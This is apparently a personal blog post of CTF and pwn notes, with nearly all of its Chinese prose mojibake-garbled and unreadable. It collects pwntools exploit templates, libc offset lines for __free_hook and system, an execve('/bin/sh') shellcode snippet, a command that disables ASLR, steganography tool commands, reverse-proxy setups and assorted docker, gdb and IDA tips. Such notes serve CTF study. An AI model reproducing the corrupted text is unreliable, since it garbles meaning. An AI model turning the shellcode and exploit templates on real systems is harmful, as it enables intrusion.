---
title: pwné¢˜æ¿å­
date: 2023-01-06 00:28:59 +0800
categories:
  - ctfæ¯”èµ›
tags:
  - pwn
  - ctf
permalink: /posts/id=50/
pin: false
published:
---

## åŸºç¡€æ¨¡æ¿ğŸ““

### ç”¨äºæ³„éœ²åœ°å€çš„libcåœ°å€åç§»

```python
heap_addr = libc_base + libc.sym['__curbrk'] # libcä¸Šçš„å †åœ°å€
stack = libc_base + libc.sym['environ'] # æ ˆåœ°å€
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
environ = libc_base + libc.sym['environ']
IO_list_all = libc_base + libc.sym['_IO_list_all']
IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

pop_rdi 


```

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","") #typ="udp"
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data).encode())
sa      = lambda text,data          :p.sendafter(text, str(data).encode())
sl      = lambda data               :p.sendline(str(data).encode())
sla     = lambda text,data          :p.sendlineafter(text, str(data).encode())
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
l64     = lambda                    :u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------
def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()


ia()
```




```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","") #typ="udp"
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------
def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()
    
ia()
```



ç²¾ç®€ç‰ˆ

```python
# _*_ coding:utf-8 _*_

from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')


p.interactive()
```

## MiscğŸ§¶
### 0å®½éšå†™ä¸€æŠŠé”

https://yuanfux.github.io/zero-width-web/

### 2å¼ å›¾ç‰‡ç›²æ°´å°

ç”¨BlindWaterMark 

```
python bwm.py decode ./ta.png ./tb.png flag.png
python3 bwmforpy3.py decode --oldseed ./ta.png ./tb.png out1.png

python3 bwmforpy3.py decode ./ta.png ./tb.png out1.png
```



### pngéšå†™

zstegä¸€æŠŠæ¢­æ£€æµ‹ lsbéšå†™ ä»¥åŠ pngæ˜¯å¦åŒ…å«å†…å®¹

```bash
zsteg --all 00000646.png
# æå–è§£å‹
zsteg 00000646.png -E b1,r,lsb,xy > 1.zip
```

stegsolve æŸ¥é€šé“å›¾



### MP3Stegoéšå†™

```bash
æ²¡å¯†ç 
./Decode.exe -X cipher.mp3
æœ‰å¯†ç 
./Decode.exe -X -P xxx cipher.mp3
```



### åˆ†ç¦»

foremost åˆ†ç¦»æ–‡ä»¶åŒ…å«

```bash
foremost 1.jpg
```



### äºŒç»´ç æ‰«ç 

https://merricx.github.io/qrazybox/

### zipä¼ªåŠ å¯†

504B0102 ï¼šç›®å½•åŒº å…¨å±€æ–¹ä½æ ‡è®°ä¸º0900==åŠ å¯†/0000 == æ— åŠ å¯†

504B0304 ï¼šæ•°æ®åŒº 0900==åŠ å¯† 

![CTF misc zipã€raræ–‡ä»¶ä¼ªåŠ å¯†_æ•°æ®åŒº](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/17110420_62abef34087ca67794.png)


### rot47è§£å¯†

https://rot47.net/

```
2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj
```


## ç–‘éš¾æ‚ç—‡å¤„ç†ğŸ’Š

### python3åŸºç¡€çŸ¥è¯†
```
b ä»£è¡¨æ˜¯å­—èŠ‚åºåˆ—ï¼Œç±»å‹æ˜¯bytes
æ²¡æœ‰b ä»£è¡¨æ˜¯å­—ç¬¦ä¸²ï¼Œç±»å‹æ˜¯str


p.recv()æ¥å—çš„æ˜¯å­—èŠ‚åºåˆ—ï¼Œä¹Ÿç§°å­—èŠ‚æµ

```

### yaruè®¾è®¡

```
mainï¼ˆç›‘æ§æ¨¡å—ï¼‰
+
é¢˜ç›®
+
shell_data_t




```

```
// æŸ¥æ‰¾æ•°æ®ï¼Œå®šä½æŒ‡é’ˆ
int fseek(FILE *stream, long int offset, int whence)

offsetæ˜¯ç›¸å¯¹whenceçš„åç§»
whenceçš„å€¼
SEEK_SET	æ–‡ä»¶çš„å¼€å¤´
SEEK_CUR	æ–‡ä»¶æŒ‡é’ˆçš„å½“å‰ä½ç½®
SEEK_END	æ–‡ä»¶çš„æœ«å°¾

// è¯»å–æ•°æ®åˆ°ç¼“å†²åŒº
size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
ptræ˜¯è¯»å–åˆ°å“ªé‡Œ
sizeæ˜¯ä¸€ä¸ªå…ƒç´ çš„å¤§å°(å­—èŠ‚)
nmembæ˜¯å‡ ä¸ªå…ƒç´ 



```


å†…å­˜å…±äº«
1.åŸºäºä¼ ç»ŸSYS Vçš„å…±äº«å†…å­˜ï¼›
2.åŸºäºPOSIX mmapæ–‡ä»¶æ˜ å°„å®ç°å…±äº«å†…å­˜ï¼›
3.é€šè¿‡memfd_create()å’Œfdè·¨è¿›ç¨‹å…±äº«å®ç°å…±äº«å†…å­˜ï¼›
4.å¤šåª’ä½“ã€å›¾å½¢é¢†åŸŸå¹¿æ³›ä½¿ç”¨çš„åŸºäºdma-bufçš„å…±äº«å†…å­˜


[ä¸–ä¸Šæœ€å¥½çš„å…±äº«å†…å­˜(Linuxå…±äº«å†…å­˜æœ€é€å½»çš„ä¸€ç¯‡)](https://cloud.tencent.com/developer/article/1551288)


ç³»ç»ŸVçš„å…±äº«å†…å­˜æ®µ
```
åŒ…å«å¤´æ–‡ä»¶:

#include <sys/shm.h>: ç”¨äºå…±äº«å†…å­˜å‡½æ•°çš„å®šä¹‰ã€‚
#include <unistd.h>: ç”¨äºå„ç§å¸¸ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚forkå’Œpipeã€‚
#include <string.h>: åŒ…å«å­—ç¬¦ä¸²æ“ä½œçš„å‡½æ•°ï¼Œå¦‚memsetã€‚
mainå‡½æ•°å®šä¹‰:

int main(int argc, char **argv): ç¨‹åºçš„å…¥å£ç‚¹ï¼Œæ¥å—å‘½ä»¤è¡Œå‚æ•°ã€‚
åˆ›å»ºå…±äº«å†…å­˜:

key_t key = ftok("/dev/shm/myshm2", 0);: ftokå‡½æ•°é€šè¿‡ç»™å®šçš„è·¯å¾„å’Œæ•´æ•°IDç”Ÿæˆä¸€ä¸ªç³»ç»ŸV IPCé”®å€¼ã€‚è¿™ä¸ªé”®å€¼ç”¨äºshmgetå‡½æ•°ã€‚
int shm_id = shmget(key, 0x400000, IPC_CREAT | 0666);: shmgetå‡½æ•°è¯•å›¾æ ¹æ®keyå€¼åˆ›å»ºä¸€ä¸ªå¤§å°ä¸º4MBï¼ˆ0x400000å­—èŠ‚ï¼‰çš„å…±äº«å†…å­˜æ®µï¼Œæƒé™è®¾ç½®ä¸º0666ï¼ˆæ‰€æœ‰ç”¨æˆ·éƒ½å¯è¯»å†™ï¼‰ã€‚IPC_CREATæ ‡å¿—æ„å‘³ç€å¦‚æœå…±äº«å†…å­˜æ®µä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºå®ƒã€‚
æ˜ å°„å…±äº«å†…å­˜:

char *p = (char *)shmat(shm_id, NULL, 0);: shmatå‡½æ•°å°†å…±äº«å†…å­˜æ®µæ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œå¹¶è¿”å›æŒ‡å‘è¯¥å†…å­˜æ®µçš„æŒ‡é’ˆã€‚
åˆå§‹åŒ–å…±äº«å†…å­˜:

memset(p, 'A', 0x400000);: memsetå‡½æ•°å°†åˆšåˆšæ˜ å°„çš„å…±äº«å†…å­˜åˆå§‹åŒ–ä¸º'A'å­—ç¬¦ï¼Œå¤§å°ä¸º4MBã€‚
åˆ†ç¦»å…±äº«å†…å­˜:

shmdt(p);: shmdtå‡½æ•°å°†å…±äº«å†…å­˜ä»å½“å‰è¿›ç¨‹çš„åœ°å€ç©ºé—´åˆ†ç¦»ã€‚
ç¨‹åºç»“æŸ:

return 0;: mainå‡½æ•°è¿”å›0ï¼Œè¡¨ç¤ºç¨‹åºæ­£å¸¸é€€å‡ºã€‚
```


### pigchaé‡ç½®ç½‘ç»œ

```
\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Http Filters
```

### Docker with Pwn






### PatchæŒ‡ä»¤

```shell
patchelf --set-interpreter ~/Desktop/ld-linux-x86-64.so.2 --set-rpath ~/Desktop/ qwarmup

patchelf  --set-interpreter  /home/ef4tless/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-linux-x86-64.so.2 --set-rpath /home/ef4tless/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/  /home/ef4tless/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libreadline.so.6

```

### AWDå‡ºé¢˜ç»éªŒ
#### è‰ºæœ¯å­—

red-phoenix


#### ç¼–è¯‘æŒ‡ä»¤

```shell
å¸¸è§„ç¼–è¯‘å‘½ä»¤

gcc -fstack-protector-all  -pie -z now -o pwn ./pwn.c


 -fno-stack-protector
 -lssl -lcrypto

NXï¼š-z execstack / -z noexecstack (å…³é—­ / å¼€å¯) å †æ ˆä¸å¯æ‰§è¡Œ
Canaryï¼š-fno-stack-protector /-fstack-protector / -fstack-protector-all (å…³é—­ / å¼€å¯ / å…¨å¼€å¯) æ ˆé‡Œæ’å…¥cookieä¿¡æ¯
ASLRå’ŒPIEï¼š-no-pie / -pie (å…³é—­ / å¼€å¯) åœ°å€éšæœºåŒ–ï¼Œå¦å¤–æ‰“å¼€åä¼šæœ‰get_pc_thunk
RELROï¼š-z norelro / -z lazy / -z now (å…³é—­ / éƒ¨åˆ†å¼€å¯ / å®Œå…¨å¼€å¯) å¯¹GOTè¡¨å…·æœ‰å†™æƒé™
asmï¼šå†…è”æ±‡ç¼– -masm=intel
-sï¼šå»é™¤ç¬¦å·è¡¨
-m32 ç¼–è¯‘32ä½


ä¸€èˆ¬é¢˜ç›®éœ€è¦

-O2
ä½¿å¾—mainå‡½æ•°å˜æˆfastcall
char s[32]çš„è¯†åˆ«ä¸èƒ½åŠ è¿™ä¸ªï¼Œä¼šè¯†åˆ«æˆint128




strip ./pwn


atoi å’Œ strtol
å¼•å…¥<stdlib.h>åº“ä¼šè‡ªåŠ¨è¯†åˆ«ä¸ºåè€…

memset
å¼•å…¥<string.h>åº“ä¸­


%s ä¼šæŠŠç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºæŒ‡é’ˆå˜é‡ï¼Œå¼•ç´¢æŒ‡é’ˆå€¼


å¾ªç¯åˆ¤æ–­è¦æ³¨æ„æ•°ç»„æœ«å°¾çš„å›è½¦ä¸è¦åŠ å…¥åˆ¤æ–­
å•ç‹¬åˆ é™¤

è¾“å‡º
putsçš„å‚æ•°åªèƒ½æ˜¯æŒ‡é’ˆ
printfæ‰æ˜¯æ­£å¸¸çš„è¾“å‡ºå‡½æ•°




```


### æ— çº¿å®‰å…¨

2.4GHzä¸5GHzéƒ½å±äºæ— çº¿ç”µï¼ˆé¢‘ç‡åœ¨3Hz-300HzèŒƒå›´å†…çš„ç”µç£æ³¢ï¼‰çš„é¢‘æ®µèŒƒå›´
èµ«å…¹ï¼ˆHzï¼‰åˆ°å…†èµ«å…¹ï¼ˆMHzï¼‰å’Œåƒå…†èµ«å…¹ï¼ˆGHzï¼‰

### CMSwebæ¡†æ¶æŸ¥æ‰¾

https://www.yunsee.cn/



### å®‰å“åˆ·æœº

å¡åˆ·ï¼ˆrecoveryï¼‰
å°†å®Œæ•´çš„åˆ·æœºåŒ…æ”¾å…¥æ‰‹æœºçš„sdcardä¸­
æ‰‹æœºè¿›å…¥recoveryæ¨¡å¼ç›´æ¥å®‰è£…ï¼Œæ•´ä¸ªå®‰è£…ä¸éœ€è¦ç”µè„‘å‚ä¸
ç®€å•å¿«æ·ï¼Œä¸æ˜“å‡ºé”™ï¼Œé€‚åˆæ–°æ‰‹

çº¿åˆ·ï¼ˆfastbootï¼‰
åˆ·æœºåŒ…åœ¨ç”µè„‘ä¸­ï¼Œåˆ©ç”¨åˆ·æœºè½¯ä»¶å¯¹æ‰‹æœºè¿›è¡Œåˆ·æœº
å®é™…ä¸Šæ‰‹æœºè¿›å…¥äº†fastbootæ¨¡å¼
éœ€è¦ç”µè„‘å®‰è£…å¥½æ‰‹æœºé©±åŠ¨å¹¶è¿æ¥
å®¹æ˜“å‡ºé”™ï¼Œä¸€èˆ¬ç”¨æ¥æ•‘ç –


OTAï¼ˆAndroid OSï¼‰
Over-The-Air ç©ºä¸­ä¸‹è½½æŠ€æœ¯
å°±æ˜¯æ‰‹æœºè®¾ç½®ä¸­æ›´æ–°æ“çºµç³»ç»Ÿï¼Œä¸‹è½½è¡¥ä¸åŒ…ï¼Œæ–‡ä»¶ä¸å¤§
æ‰‹æœºå°±åœ¨Android OSå±‚é¢å®Œæˆäº†è¡¥ä¸çš„ä¸‹è½½ï¼Œå¹¶è‡ªåŠ¨æ›´æ–°
ä¸€èˆ¬æ‰‹æœºrootåå°†ä¸å†æä¾›ç³»ç»Ÿæ›´æ–°

åˆ·æœºåŒ…ï¼šROM(æ“ä½œç³»ç»Ÿæ–‡ä»¶åŒ…){å†…æ ¸  åŸºå¸¦ï¼šå†³å®šäº†æ‰‹æœºå¯ä»¥ä½¿ç”¨çš„è¿è¥å•†æœåŠ¡}
### DNSåŠ«æŒ

```
114.114.114.114 //114 dns ç”±ä¸­å›½ç”µä¿¡è¿è¥å•†æä¾›
8.8.8.8   // google dns

nslookup [åŸŸåæˆ–IPåœ°å€] [DNSæœåŠ¡å™¨]


# æ£€æµ‹
nslookup whether.114dns.com 114.114.114.114
è¿”å›å›ç¯åœ°å€127.0.0.1å³è¢«åŠ«æŒï¼Œå¦åˆ™ä¸ºå…¬ç½‘IP
å¤§å¤šæ•°åŠ«æŒudp 53çš„dns


# å¼ºåˆ¶ä½¿ç”¨tcpè§£æåŸŸå
nslookup -vc whether.114dns.com 114.114.114.114
```

### tipsæ”¶é›†

```python
chr() # 16è¿›åˆ¶è½¬å­—ç¬¦
ord() # å­—ç¬¦è½¬16è¿›åˆ¶
ï¼….* s # è¡¨ç¤ºä»ä»¥ä¸‹ç¼“å†²åŒºæ‰“å°å‰Xä¸ªå­—ç¬¦
[rax] å–å€¼
# æŒ‡é’ˆå˜é‡
å˜é‡å°±æ˜¯ä¸€ä¸ªåœ°å€/ä¸€ä¸ªæ•°æ®çš„å£³
	ç±»å‹æ˜¯int*
	p = p+1;# +8(1*int)
    èµ‹å€¼è¯­å¥:èµ‹ç»™è°
    a = 3
    0x1234 a 0x0000003 0x0000000
    aå˜é‡åœ°å€ = 3

# åä¸‰ä½ç½®é›¶(Cè¯­è¨€)
stack_addr = stack_addr & (~0xfff);

# å…³é—­ALSR
echo 0 > /proc/sys/kernel/randomize_va_space

# åˆ‡æ¢pythonç‰ˆæœ¬
sudo update-alternatives --config python

# æœ¬åœ°patchelf
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath ./ qwarmup
patchelf --set-interpreter ~/glibc-all-in-one/\libs/2.23-0ubuntu7_amd64/ld-linux-x86-64.so.2 --set-rpath ~/glibc-all-in-one/\libs/2.23-0ubuntu7_amd64/ ./pwn


# è™šæ‹Ÿæœº vscode
sudo apt install openssh-server
service sshd start

# busybox
busybox mkdir -p /usr/bin
busybox --install -s /usr/bin

# idaä½¿ç”¨æŠ€å·§
shift+E # å¯¼å‡ºæ•°æ®

# ç½‘ç»œå¯åŠ¨
sudo nmcli networking on

# /bin/sh
sh = 0x68732f6e69622f

# torçˆ¬è™«éªŒè¯
curl --socks5 localhost:9150 --socks5-hostname localhost:9150 -s https://check.torproject.org/ | cat | grep -m 1 Congratulations | xargs

# åº”ç”¨qilingç¯å¢ƒ
source ~/qilingenv/bin/activate

# è½¯è¿æ¥
ln -s cgibin hedwig.cgi
hedwig,cgi-> cgibin

# ida è½¬ asciiç 
é€‰ä¸­åŒºåŸŸæŒ‰a

# å¯»æ‰¾ä¸ºè½¬åŒ–å­—ç¬¦åœ°å€
æ‰”è¿›01editoræœç´¢

# ida
ç”¨åˆ°äº†å†æ›´æ–°
ç©ºæ ¼é”® ï¼šåæ±‡ç¼–çª—å£åˆ‡æ¢æ–‡æœ¬è·Ÿå›¾å½¢
ESCé€€åˆ°ä¸Šä¸€ä¸ªæ“ä½œåœ°å€
Gæœç´¢åœ°å€æˆ–è€…ç¬¦å·
Né‡å‘½å
åˆ†å·é”® ï¼šæ³¨é‡Š
ALT+M æ·»åŠ æ ‡ç­¾
CTRL+M åˆ—å‡ºæ‰€æœ‰æ ‡ç­¾
CTRL +S äºŒè¿›åˆ¶æ®µçš„å¼€å§‹åœ°å€ç»“æŸåœ°å€
C code å…‰æ ‡åœ°å€å‡ºå†…å®¹è§£ææˆä»£ç 
P åœ¨å‡½æ•°å¼€å§‹å¤„ä½¿ç”¨Pï¼Œä»å½“å‰åœ°å€å¤„è§£ææˆå‡½æ•°
D dataè§£ææˆæ•°æ®
A ASCIIè§£ææˆASCII
U unDefinedè§£ææˆæœªå®šä¹‰çš„å†…å®¹
X äº¤å‰å¼•ç”¨
F5 Cä¼ªä»£ç 
èœå•æ ä¸­çš„æœç´¢åŠŸèƒ½ä¸­
æœ‰ALT+T æœç´¢æ–‡æœ¬
ALT+B æœç´¢16è¿›åˆ¶ æœç´¢opcode å¦‚ELFæ–‡ä»¶å¤´
æ‰“å¼€æ–­ç‚¹åˆ—è¡¨ CTRL+ALT+B
å•æ­¥æ­¥å…¥ F7
å•æ­¥ä¸è¿‡ F8
è¿è¡Œåˆ°å‡½æ•°è¿”å›åœ°å€ CTRL+F7
è¿è¡Œåˆ°å…‰æ ‡å¤„ F4

shift+E å¯¼å‡ºæ•°æ®ï¼Œå¯æå–ä¸€äº›æ•°æ®
shift+? è®¡ç®—å™¨


# åå°è¿è¡Œ gohttpserver
sudo nohup ./gohttpserver -r ../share --port 80 1>/dev/null 2>&1 &

# å¿«é€Ÿèµ·é¢˜ç›®å’Œç«¯å£
socat tcp-l:8888,reuseaddr,fork exec:./blind
```


### glibcå¯¹åº”ç‰ˆæœ¬dockeræ‹‰å–
```
google æœç´¢å…³é”®å­— dockerhub 2.37-0ubuntu1
```


### hyper-V å’Œ VMware åˆ‡æ¢

å…³é—­hyper-V

wifiç½‘ç»œé€‚é…å™¨å³é”®å–æ¶ˆæ¡¥æ¥ï¼

<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/ccfaeb528b034a12b43b5bc415d209e5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" style="zoom: 33%;" />

```bash
bcdedit /set hypervisorlaunchtype off
bcdedit /set hypervisorlaunchtype auto
```

å¯ç”¨hyper-V

æ–°å»ºå¤–éƒ¨è™šæ‹Ÿç½‘ç»œ

### æœåŠ¡å™¨nginxæœåŠ¡å™¨

```bash
# å®‰è£…
sudo apt-get install nginx
# which nginx
# /usr/sbin/nginx -t
sudo nano /etc/nginx/conf.d/file_server.conf

server {
  listen 80; 
  server_name e4l4.com; # è‡ªå·±PCçš„ipæˆ–è€…æœåŠ¡å™¨çš„åŸŸå 
  charset utf-8; # é¿å…ä¸­æ–‡ä¹±ç  
  root /home/lighthouse/share; # å­˜æ”¾æ–‡ä»¶çš„ç›®å½• 
  location / { 
    autoindex on; # ç´¢å¼• 
    autoindex_exact_size on; # æ˜¾ç¤ºæ–‡ä»¶å¤§å° 
    autoindex_localtime on; # æ˜¾ç¤ºæ–‡ä»¶æ—¶é—´ 
  }
}

sudo rm /etc/nginx/sites-enabled/default
sudo service nginx reload


# å…³äºnginxçš„å‘½ä»¤
sudo /etc/init.d/nginx start|stop|reload|
sudo service nginx start|stop|reload|

```



### dockerå‘½ä»¤

```bash
# æ„å»ºé•œåƒï¼š
docker build -f /path/Dockerfile -t imgname(tag)
docker images
docker run -itd --name ycbsql -p 9999:9999 ycbsql
docker ps

# æŸ¥çœ‹é¡¹ç›®è¿è¡Œæ—¥å¿—
docker logs --tail 500 ycbsql

docker exec -it 115e791688f1 "/bin/bash"
```

### åå‘ä»£ç†

iox åå‘ä»£ç†

```bash
./iox proxy -l 9999 -l 1080

./iox proxy -r e4l4.com:9999
iox.exe proxy -r e4l4.com:9999
```

frpåå‘ä»£ç†

```shell
# å¤–ç½‘ç«¯
./frps -c frps.ini

# å†…ç½‘ç«¯
./frpc -c frpc.ini
```





### GDBè°ƒè¯•æŠ€å·§

```shell
# è°ƒè¯•è¿›ç¨‹
sudo gdb -p <pid>

# è°ƒè¯•å¤šçº¿ç¨‹ https://blog.csdn.net/gatieme/article/details/78309696
set follow-fork-mode [parent|child]		# è®¾ç½®è°ƒè¯•[çˆ¶è¿›ç¨‹/å­è¿›ç¨‹]
set detach-on-fork [on|off]				# æœªè°ƒè¯•è¿›ç¨‹[ç»§ç»­æ‰§è¡Œ/blockåœ¨forkä½ç½®]
show follow-fork-mode
show detach-on-fork
info inferiors				# æŸ¥çœ‹æ­£åœ¨è°ƒè¯•çš„è¿›ç¨‹ä¿¡æ¯
info threads				# æŸ¥è¯¢çº¿ç¨‹
thread <thread number>		# åˆ‡æ¢çº¿ç¨‹


# strace -ff -o test.txt ./dns -C ./dns.conf

# å†…å­˜æœç´¢
search -4 0x73a2f100 # å‡è®¾åé¢é‚£ä¸ªå€¼ä¸ºcanaryçš„å€¼
search -8 0x58e1f3982b6400 # åé¢é‚£ä¸ªå€¼ä¸ºcanaryçš„å€¼

```

```shell
# è®¾ç½®å¯„å­˜å™¨
set $rax=0
```






### æ ˆå¯¹é½

```c
movaps xmmword ptr [rsp + 0x50], xmm0
```

ä½¿ç”¨ **XMM** æ—¶ï¼Œéœ€è¦ **16Byte** å¯¹é½ï¼›ä½¿ç”¨ **YMM** æ—¶ï¼Œéœ€è¦ **32Byte** å¯¹é½ï¼›ä½¿ç”¨ **ZMM** æ—¶ï¼Œéœ€è¦ **64Byte** å¯¹é½ã€‚



### shellcode(æ±‡ç¼–)



```
mov        ä¸€ä¸ªå˜é‡æˆ–è€…å¯„å­˜å™¨ï¼Œ ä¸€ä¸ªå˜é‡æˆ–è€…å¯„å­˜å™¨é‡Œè¾¹çš„å€¼
lea          ä¸€ä¸ªå˜é‡æˆ–è€…å¯„å­˜å™¨,    ä¸€ä¸ªå˜é‡æˆ–è€…å¯„å­˜å™¨


cdq    æ‰§è¡Œårdxçš„å€¼ä¸º0x00000000æˆ–0xFFFFFFFF  
#  å­—èŠ‚ç ä¸º"\x99" è¡¨ç¤ºâ€œè½¬æ¢åŒå­—ä¸ºå››å­—â€ åœ¨æ‰§è¡Œ`cdq`æŒ‡ä»¤æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥`EAX`å¯„å­˜å™¨ä¸­çš„ç¬¦å·ä½ï¼ˆç¬¬31ä½ï¼‰ï¼Œå°†eaxæ‰©å±•åçš„ç¬¦å·ä½å¤åˆ¶åˆ°edxä¸­

jmp $-0x19  # çŸ­è·³è½¬ ç›¸å¯¹RIP

```





read()

```assembly
    mov rdi, r15
    xor eax, eax
    cdq
    mov al, 10
    mov dl, 7
    syscall # mprotect
    
    xor eax, eax
    mov esi, edi
    mov edi, eax
    mov dl, 0x7f
    syscall # read
    
# æ·»åŠ nop
p.send('\x90' * 0x16 + asm('''
    mov rsp, rsi
    add rsp, 0x1000

    xor rsi, rsi
    mul rsi # rax = 0

    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx

    mov rdi, rsp
    mov al, 59

    syscall # execve("/bin/sh",0,0)
'''))
```







### docker ç½‘æ¡¥åˆ é™¤

æ ¹æ®ä½ æä¾›çš„ç½‘ç»œè®¾å¤‡ä¿¡æ¯ï¼Œä½ æœ‰å¾ˆå¤š Docker ç½‘ç»œæ¡¥ï¼ˆbr-02e7e9c790beï¼Œbr-1df37dd21e5bï¼Œbr-4e91b786b58eï¼‰ä»¥åŠä¸€ä¸ªé»˜è®¤çš„ Docker ç½‘ç»œæ¡¥ï¼ˆdocker0ï¼‰ã€‚è¦åˆ é™¤è¿™äº› Docker ç½‘ç»œæ¡¥ï¼Œä½ å¯ä»¥ä½¿ç”¨ Docker çš„å‘½ä»¤è¡Œå·¥å…·ã€‚

åœ¨ Docker ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ `docker network ls` å‘½ä»¤æ¥æŸ¥çœ‹æ‰€æœ‰çš„ç½‘ç»œã€‚ä½ å¯ä»¥çœ‹åˆ°æ¯ä¸ªç½‘ç»œçš„ IDã€åç§°ã€é©±åŠ¨å’ŒèŒƒå›´ã€‚ç„¶åä½ å¯ä»¥ä½¿ç”¨ `docker network rm` å‘½ä»¤æ¥åˆ é™¤ç‰¹å®šçš„ç½‘ç»œã€‚ä½ éœ€è¦ç”¨ç½‘ç»œçš„ ID æˆ–è€…åç§°ä½œä¸ºå‚æ•°ã€‚

ä¾‹å¦‚ï¼Œè¦åˆ é™¤ä¸€ä¸ªåä¸º `my_network` çš„ç½‘ç»œï¼Œä½ å¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```
docker network rm my_network
```

å¦‚æœä½ æƒ³è¦åˆ é™¤æ‰€æœ‰çš„ç½‘ç»œï¼Œä½ å¯ä»¥å°† `docker network ls` çš„è¾“å‡ºï¼ˆä¹Ÿå°±æ˜¯æ‰€æœ‰ç½‘ç»œçš„ IDï¼‰ä¼ é€’ç»™ `docker network rm` å‘½ä»¤ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªåˆ é™¤æ‰€æœ‰ç½‘ç»œçš„ Bash è„šæœ¬ï¼š

```
docker network ls -q | xargs docker network rm
```

